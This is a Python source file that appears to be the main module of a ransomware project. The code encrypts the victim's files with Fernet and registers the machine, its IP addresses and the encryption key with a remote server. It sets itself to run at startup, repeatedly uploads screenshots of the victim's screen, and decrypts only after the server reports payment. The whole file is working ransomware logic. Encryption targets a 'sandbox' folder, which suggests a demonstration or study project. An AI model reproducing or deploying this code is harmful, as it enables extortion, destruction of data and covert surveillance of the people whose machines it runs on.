#  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com

"""System modules"""
import sys
import os
import threading

from wcmatch import glob

from dotenv import load_dotenv

# codes line allow to package env in the exe file
# BUT they can be find easily without encryption of exe

extDataDir = os.getcwd()
if getattr(sys, 'frozen', False):
    extDataDir = sys._MEIPASS
load_dotenv(dotenv_path=os.path.join(extDataDir, '.env'))

# pylint: disable=wrong-import-position
# pylint: disable=wrong-import-order
import time
import requests
from cryptography.fernet import Fernet
from os.path import isfile
import asyncio
import datetime
from threading import Thread

from modules.cryptography.file_decryption import decrypt_file
from modules.cryptography.file_encryption import encrypt_file
from modules.internet.get_ressources import get_has_paid, get_the_decryption_key
from modules.internet.post_ressources import create_computer, post_image
from modules.miscellaneous.computer_properties import get_computer_name, \
    get_computer_os, get_public_ip, get_private_ip, take_screenshot, startup_exec
from modules.miscellaneous.config_file import get_config_file_info, \
    create_config_file, edit_config_file
from modules.internet.patch_ressources import patch_last_message_date

TRUE_ALIASES = [True, "True", "true", "yes"]


def get_all_files_in_directory(path):
    """
    This function return all files and sub_files in a directory passed in param
    1) Use Glob to get all the file and return them in array shape
    :param path: the start path
    """
    return [f for f in glob.glob(path + '/**/*.{' + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}',
                                 flags=glob.BRACE | glob.GLOBSTAR) if isfile(f)]


def main():
    """
    This function is the main function
    """
    is_connected = False
    key = ""
    # -- STARTUP MODULE --
    startup_exec()
    # -- STARTUP MODULE --
    if get_config_file_info("encrypted") not in TRUE_ALIASES:
        print("-- START OF ENCRYPTION STEP --")
        # -- ENCRYPT MODULE --
        threads = []

        key = Fernet.generate_key()

        print("-- KEY GENERATED --")

        fernet = Fernet(key)

        files = get_all_files_in_directory("sandbox")

        for file in files:
            thread = threading.Thread(target=encrypt_file, args=(file, fernet,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print("-- END OF ENCRYPTION STEP --")
        # -- ENCRYPT MODULE --

    # -- CHANGE BG MODULE --
    # change_background_image(getcwd() + "/" + get_image())
    # -- CHANGE BG MODULE --

    computer_id = get_config_file_info("computer_id")

    if computer_id == -1:
        while is_connected is not True:
            try:
                print("-- CREATION OF COMPUTER --")
                computer_id = create_computer(get_public_ip(), get_private_ip(), get_computer_os(),
                                              get_computer_name(), key.decode())["id"]
                print("-- CREATION OF CONFIG FILE --")
                create_config_file(computer_id)
                is_connected = True
            except requests.ConnectionError:
                is_connected = False
                print("Wait for web server to respond . . .")
                time.sleep(10)

    screenshot = Thread(target=screenshot_module, args=(computer_id,), daemon=True)
    has_paid_checker = Thread(target=has_paid_checker_module, args=(computer_id,), daemon=True)

    screenshot.start()
    has_paid_checker.start()
    has_paid_checker.join()


# -- HAS PAID MODULE --

def has_paid_checker_module(computer_id: str):
    """
    This function check if the user has paid on the web server
    1) Loop undefinitively and ask the web server if the client has paid
    2) Wait X seconds (X => value in env file)
    3) Re check again
    4) ...
    :param computer_id: The ID of the computer
    """
    while True:
        try:
            print("-- HE HAS PAID : --" + str(get_has_paid(computer_id)))
            if get_has_paid(computer_id):
                key = get_the_decryption_key(computer_id).encode()
                files = get_all_files_in_directory("sandbox")
                if key:
                    threads = []
                    for file in files:
                        thread = threading.Thread(target=decrypt_file, args=(file, Fernet(key, )))
                        threads.append(thread)
                        thread.start()
                    for thread in threads:
                        thread.join()

                    edit_config_file("has_paid", "True")
                sys.exit(0)
        except requests.ConnectionError:
            print("Wait for web server to respond . . .")
            time.sleep(10)
        time.sleep(float(os.getenv("DELAY_BETWEEN_HAS_PAID_CHECK")))


# --  HAS PAID MODULE --


# -- SCREENSHOT MODULE --

def screenshot_module(computer_id):
    """
    This function make screenshot and send them to the web server all the X time
    1) Loop undefinitivly and send to the web server screenshot
    2) Wait X seconds (X => value in env file)
    3) Re send another screenshot again
    4) ...
    :param computer_id: The ID of the computer
    """
    while True:
        try:
            if os.getenv("ENABLE_SCREENSHOT") in TRUE_ALIASES:
                path = take_screenshot(os.environ['USERPROFILE'] + '\\Pictures\\')
                post_image(path, computer_id)
                patch_last_message_date(computer_id, datetime.datetime.now(datetime.timezone.utc))
                time.sleep(float(os.getenv("DELAY_BETWEEN_SCREENSHOTS")))
        except requests.ConnectionError:
            print("Wait for web server to respond . . .")
            time.sleep(10)


# -- SCREENSHOT MODULE --


if __name__ == '__main__':

    if get_config_file_info("has_paid") in TRUE_ALIASES:
        sys.exit(0)
    asyncio.run(main())
